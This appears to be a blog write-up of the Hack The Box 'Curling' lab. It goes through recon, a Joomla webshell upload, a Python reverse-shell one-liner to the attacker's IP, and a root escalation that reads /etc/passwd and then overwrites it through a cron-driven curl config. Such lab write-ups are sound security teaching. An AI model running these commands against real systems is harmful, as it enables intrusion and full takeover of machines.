@@ -1,0 +1,515 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Curling - Hack The Box</title>
+  <meta name="description" content="Resolution of the Curling machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Curling - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/curling">
+  <meta property="og:description" content="Resolution of the Curling machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/curling">
+  <meta name="twitter:title" content="Curling - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Curling machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/curling/curling-00-108c484752e35e759947171014121b878f4f1e3aca195ce877032fea2e3765d3.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/curling/curling-00-108c484752e35e759947171014121b878f4f1e3aca195ce877032fea2e3765d3.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Curling - Hack The Box</h1>
+            <p>Resolution of the Curling machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    June 26, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      6 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/curling/curling-00-108c484752e35e759947171014121b878f4f1e3aca195ce877032fea2e3765d3.png">
+  <img src="/assets/hackthebox/curling/curling-00-108c484752e35e759947171014121b878f4f1e3aca195ce877032fea2e3765d3.png" alt="Curling banner" class="zooming" data-rjs="/assets/hackthebox/curling/curling-00-108c484752e35e759947171014121b878f4f1e3aca195ce877032fea2e3765d3.png" data-zooming-width="597" data-zooming-height="381">
+</a></p>
+
+<p>Curling is an easy level machine based on Linux, the initial approach is based on a <code class="highlighter-rouge">Joomla!</code> vulnerability where it’s possible to obtain a webshell.
+The privilege escalation process has two stages, the first one it’s necessary some basic knowledge about file <code class="highlighter-rouge">decompressions</code> and the last one requires knowledge about <code class="highlighter-rouge">curl</code> config parameters.</p>
+
+<h1 id="recon">Recon</h1>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.80 scan initiated Fri Apr 10 15:52:03 2020 as: nmap -sC -sV -T4 -oA curling 10.10.10.150</span>
+Nmap scan report <span class="k">for </span>10.10.10.150
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca <span class="o">(</span>RSA<span class="o">)</span>
+|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Home
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Fri Apr 10 15:52:20 2020 -- 1 IP address (1 host up) scanned in 17.24 seconds</span></code></pre></figure>
+
+<p>Port 80 has the page:</p>
+
+<p><a href="/assets/hackthebox/curling/curling-01-19b5c1ee64280c47c5344fda88b5f4e99e597f4389e736b6162b6b7891e8b66f.png">
+  <img src="/assets/hackthebox/curling/curling-01-19b5c1ee64280c47c5344fda88b5f4e99e597f4389e736b6162b6b7891e8b66f.png" alt="Curling Recon" class="zooming" data-rjs="/assets/hackthebox/curling/curling-01-19b5c1ee64280c47c5344fda88b5f4e99e597f4389e736b6162b6b7891e8b66f.png" data-zooming-width="985" data-zooming-height="537">
+</a></p>
+
+<p>After enumerating the web server with the gobuster tool, we got the following output:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">./gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://10.10.10.150 <span class="nt">-t</span> 20
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.150
+<span class="o">[</span>+] Threads:        20
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/04/10 16:02:58 Starting gobuster
+<span class="o">===============================================================</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/administrator <span class="o">(</span>Status: 301<span class="o">)</span>
+/bin <span class="o">(</span>Status: 301<span class="o">)</span>
+/cache <span class="o">(</span>Status: 301<span class="o">)</span>
+/cli <span class="o">(</span>Status: 301<span class="o">)</span>
+/components <span class="o">(</span>Status: 301<span class="o">)</span>
+/images <span class="o">(</span>Status: 301<span class="o">)</span>
+/includes <span class="o">(</span>Status: 301<span class="o">)</span>
+/language <span class="o">(</span>Status: 301<span class="o">)</span>
+/layouts <span class="o">(</span>Status: 301<span class="o">)</span>
+/libraries <span class="o">(</span>Status: 301<span class="o">)</span>
+/media <span class="o">(</span>Status: 301<span class="o">)</span>
+/modules <span class="o">(</span>Status: 301<span class="o">)</span>
+/plugins <span class="o">(</span>Status: 301<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+/templates <span class="o">(</span>Status: 301<span class="o">)</span>
+/tmp <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/04/10 16:05:40 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>The <code class="highlighter-rouge">/administrator</code> page has a Joomla! login form:</p>
+
+<p><a href="/assets/hackthebox/curling/curling-02-604a6b797eed520f62e3db0a94bd76861bbe243bed6025b68a7e980c1f93bd10.png">
+  <img src="/assets/hackthebox/curling/curling-02-604a6b797eed520f62e3db0a94bd76861bbe243bed6025b68a7e980c1f93bd10.png" alt="Curling Recon" class="zooming" data-rjs="/assets/hackthebox/curling/curling-02-604a6b797eed520f62e3db0a94bd76861bbe243bed6025b68a7e980c1f93bd10.png" data-zooming-width="946" data-zooming-height="556">
+</a></p>
+
+<p>Verifying the page’s source-code, we found an interesting .txt file named <code class="highlighter-rouge">secret.txt</code> inside a HTML comment:</p>
+
+<p><a href="/assets/hackthebox/curling/curling-03-d01ee043a130899503e36fe74a72bd096da5a922221821c6cca7deedc5b6f72f.png">
+  <img src="/assets/hackthebox/curling/curling-03-d01ee043a130899503e36fe74a72bd096da5a922221821c6cca7deedc5b6f72f.png" alt="Curling Recon" class="zooming" data-rjs="/assets/hackthebox/curling/curling-03-d01ee043a130899503e36fe74a72bd096da5a922221821c6cca7deedc5b6f72f.png" data-zooming-width="963" data-zooming-height="540">
+</a></p>
+
+<p><a href="/assets/hackthebox/curling/curling-04-76c33bc3b9ae9d88fdb73c819b2ef411b268136a83462ea8b41c7255d813266c.png">
+  <img src="/assets/hackthebox/curling/curling-04-76c33bc3b9ae9d88fdb73c819b2ef411b268136a83462ea8b41c7255d813266c.png" alt="Curling Recon" class="zooming" data-rjs="/assets/hackthebox/curling/curling-04-76c33bc3b9ae9d88fdb73c819b2ef411b268136a83462ea8b41c7255d813266c.png" data-zooming-width="814" data-zooming-height="188">
+</a></p>
+
+<p>The output of the base64 string <code class="highlighter-rouge">Q3VybGluZzIwMTgh</code> is <code class="highlighter-rouge">Curling2018!</code>, probably the administrator panel’s password.
+We successfully logged in as <code class="highlighter-rouge">floris</code> with the <code class="highlighter-rouge">Curling2018!</code> password :)</p>
+
+<p><a href="/assets/hackthebox/curling/curling-05-ace5e561dc8eec2dd4d72c45b247db1c9f1d24612d5ed588b55145872e30cb0d.png">
+  <img src="/assets/hackthebox/curling/curling-05-ace5e561dc8eec2dd4d72c45b247db1c9f1d24612d5ed588b55145872e30cb0d.png" alt="Curling Recon" class="zooming" data-rjs="/assets/hackthebox/curling/curling-05-ace5e561dc8eec2dd4d72c45b247db1c9f1d24612d5ed588b55145872e30cb0d.png" data-zooming-width="1314" data-zooming-height="554">
+</a></p>
+
+<h1 id="exploiting---using-an-exploit-to-upload-a-php-webshell-to-joomla">Exploiting - Using an exploit to upload a PHP webshell to Joomla!</h1>
+
+<p>Searching on Google for suitable exploits for Joomla! 3.x, we found an exploit that uploads a PHP web shell through beez3’s template.</p>
+
+<p><a href="https://github.com/rootphantomer/hack_tools_for_me/blob/master/Joomla-Shell-Upload.py" target="_blank">Joomla-Shell-Upload.py</a></p>
+
+<p>This script actually works by authenticating on Joomla’s panel using the credentials that we got early and injecting a malicious PHP webshell on beez3’s template.</p>
+
+<p>After executing the script, a PHP webshell is uploaded:</p>
+
+<p><a href="/assets/hackthebox/curling/curling-06-ed19ec33c21c4ee304bba7747bfd1a6f05b53e42eeef8ae9f6fd7a36029090fb.png">
+  <img src="/assets/hackthebox/curling/curling-06-ed19ec33c21c4ee304bba7747bfd1a6f05b53e42eeef8ae9f6fd7a36029090fb.png" alt="Curling Exploit" class="zooming" data-rjs="/assets/hackthebox/curling/curling-06-ed19ec33c21c4ee304bba7747bfd1a6f05b53e42eeef8ae9f6fd7a36029090fb.png" data-zooming-width="580" data-zooming-height="212">
+</a></p>
+
+<p>Now we can execute system commands through the PHP webshell!</p>
+
+<p><a href="/assets/hackthebox/curling/curling-07-409d25b5de7c955a151f13aaf855c418788c74d8b4caff46b0590d02ac1c5c71.png">
+  <img src="/assets/hackthebox/curling/curling-07-409d25b5de7c955a151f13aaf855c418788c74d8b4caff46b0590d02ac1c5c71.png" alt="Curling Exploit" class="zooming" data-rjs="/assets/hackthebox/curling/curling-07-409d25b5de7c955a151f13aaf855c418788c74d8b4caff46b0590d02ac1c5c71.png" data-zooming-width="754" data-zooming-height="156">
+</a></p>
+
+<p>A Python reverse shell stager is sent to the server to establish a reverse shell connection with our netcat on listening mode:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.37",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre></figure>
+
+<p><a href="/assets/hackthebox/curling/curling-12-c8d167326f1cc0a0ce295ffb2a26bce206bff6a38e8fda8272577ff3d11a2a30.png">
+  <img src="/assets/hackthebox/curling/curling-12-c8d167326f1cc0a0ce295ffb2a26bce206bff6a38e8fda8272577ff3d11a2a30.png" alt="Curling Exploit" class="zooming" data-rjs="/assets/hackthebox/curling/curling-12-c8d167326f1cc0a0ce295ffb2a26bce206bff6a38e8fda8272577ff3d11a2a30.png" data-zooming-width="441" data-zooming-height="129">
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that exploits this vulnerability and spawn an interactive shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/curling" target="_blank">Curling Exploit</a></p>
+
+<p><a href="/assets/hackthebox/curling/curling-08-a250b48e496ef09342af6ecf551bab4283ffaba26d19c606384311d050227b69.png">
+  <img src="/assets/hackthebox/curling/curling-08-a250b48e496ef09342af6ecf551bab4283ffaba26d19c606384311d050227b69.png" alt="Curling Exploit" class="zooming" data-rjs="/assets/hackthebox/curling/curling-08-a250b48e496ef09342af6ecf551bab4283ffaba26d19c606384311d050227b69.png" data-zooming-width="770" data-zooming-height="305">
+</a></p>
+
+<h1 id="post-exploitation---dealing-with-file-decompressions-and-curl-config-file-format">Post Exploitation - Dealing with file decompressions and curl config file format</h1>
+
+<p>After a basic enumeration, we found an interesting file named <code class="highlighter-rouge">password_backup</code> located on <code class="highlighter-rouge">/home/floris</code>. Using the command <code class="highlighter-rouge">file</code> we can see that the file is a <code class="highlighter-rouge">bzip2</code> filetype.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">cat </span>password_backup | xxd <span class="nt">-r</span> <span class="o">&gt;</span> password_backup.bz2</code></pre></figure>
+
+<p>After that, we unzip the bz2 file using the <code class="highlighter-rouge">bzip2</code> tool:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">bzip2 <span class="nt">-d</span> password_backup.bz2</code></pre></figure>
+
+<p>Let’s check the file type again:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">file password_backup</code></pre></figure>
+
+<blockquote>
+  <p>password_backup: gzip compressed data, was “password”, last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141</p>
+</blockquote>
+
+<p>We need to rename the file to add a <code class="highlighter-rouge">.gz</code> extension and then extract again using the <code class="highlighter-rouge">zcat</code> tool:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">zcat password_backup.gz <span class="o">&gt;</span> password_backup</code></pre></figure>
+
+<p>Using the <code class="highlighter-rouge">file</code> command, we noticed that the output file is a bzip2 file, then we rename it to password_backup.bz2 and unzip him:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">bzip2 <span class="nt">-d</span> password_backup.bz2</code></pre></figure>
+
+<p>Again, using the <code class="highlighter-rouge">file</code> command we noticed that the output file is a tar file, then we rename it to password_backup.tar and unzip him:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">tar</span> <span class="nt">-xvf</span> password_backup.tar</code></pre></figure>
+
+<p>Finally we got a file named <code class="highlighter-rouge">password.txt</code> with the following content:</p>
+
+<blockquote>
+  <table>
+    <tbody>
+      <tr>
+        <td>5d&lt;wdCbdZu)</td>
+        <td>hChXll</td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<p>Now we’re able to login as <code class="highlighter-rouge">floris</code> user using this password:</p>
+
+<p><a href="/assets/hackthebox/curling/curling-09-0daf4559e18affa5d3d12c35d17f1e872a4a228cc1ddd14ece6d2b08db5d2258.png">
+  <img src="/assets/hackthebox/curling/curling-09-0daf4559e18affa5d3d12c35d17f1e872a4a228cc1ddd14ece6d2b08db5d2258.png" alt="Curling Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/curling/curling-09-0daf4559e18affa5d3d12c35d17f1e872a4a228cc1ddd14ece6d2b08db5d2258.png" data-zooming-width="868" data-zooming-height="429">
+</a></p>
+
+<p>Now moving to the second stage of the privilege escalation, we need to enumerate the system.
+After a basic enumeration, we found two interesting files located at <code class="highlighter-rouge">/home/floris/admin-area</code>: <code class="highlighter-rouge">input</code> and <code class="highlighter-rouge">report</code></p>
+
+<p>They’re executed every 30 seconds by root on a cronjob.</p>
+
+<p>Checking the file structure we noticed that it’s a curl config file.</p>
+
+<p><a href="https://ec.haxx.se/cmdline/cmdline-configfile" target="_blank">Curl Config file</a></p>
+
+<p>We can edit this file and add the following param:</p>
+
+<blockquote>
+  <p>url = “file:///etc/passwd”</p>
+</blockquote>
+
+<p>After 30 seconds, the <code class="highlighter-rouge">/etc/passwd</code> content will be saved on the <code class="highlighter-rouge">report</code> file!
+We can use this vulnerability to overwrite the server’s passwd file.</p>
+
+<p>The exploit steps:</p>
+
+<ul>
+  <li>Copy the original <code class="highlighter-rouge">/etc/passwd</code> content to our machine</li>
+  <li>Add a new user named <code class="highlighter-rouge">root2</code> with superuser permissions</li>
+  <li>Generate a password to the root2 user:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">openssl passwd nullarmor</code></pre></figure>
+
+<p>The passwd file should look like this:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+floris:x:1000:1004:floris:/home/floris:/bin/bash
+root2:z4h3ad8EMb53c:0:0:root:/root:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false</code></pre></figure>
+
+<ul>
+  <li>Set up a web server to serve our modificated passwd file using SimpleHTTPServer:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python <span class="nt">-m</span> SimpleHTTPServer 8000</code></pre></figure>
+
+<ul>
+  <li>Change the <code class="highlighter-rouge">url</code> parameter to our modificated passwd file hosted on our machine and <code class="highlighter-rouge">output</code> paramater to overwrite the <code class="highlighter-rouge">/etc/passwd</code> file:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">url <span class="o">=</span> <span class="s2">"http://10.10.14.37:8000/passwd_modificado"</span>
+output <span class="o">=</span> <span class="s2">"/etc/passwd"</span></code></pre></figure>
+
+<p>After 30 seconds, we can see if the passwd file was overwritten:</p>
+
+<p><a href="/assets/hackthebox/curling/curling-10-97b4a738a8b313028ebd070f373385132190378db7879b7f5d28769a8b9e5600.png">
+  <img src="/assets/hackthebox/curling/curling-10-97b4a738a8b313028ebd070f373385132190378db7879b7f5d28769a8b9e5600.png" alt="Curling Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/curling/curling-10-97b4a738a8b313028ebd070f373385132190378db7879b7f5d28769a8b9e5600.png" data-zooming-width="583" data-zooming-height="413">
+</a></p>
+
+<p>Done, now we have a new user named <code class="highlighter-rouge">root2</code> with superuser permissions!</p>
+
+<p><a href="/assets/hackthebox/curling/curling-11-42f33ddb8a2ed2b245f4adb5b32ce2846c3791f1f02a6b31167e165da686cf5d.png">
+  <img src="/assets/hackthebox/curling/curling-11-42f33ddb8a2ed2b245f4adb5b32ce2846c3791f1f02a6b31167e165da686cf5d.png" alt="Curling Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/curling/curling-11-42f33ddb8a2ed2b245f4adb5b32ce2846c3791f1f02a6b31167e165da686cf5d.png" data-zooming-width="353" data-zooming-height="85">
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Curling+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/curling%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/curling" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
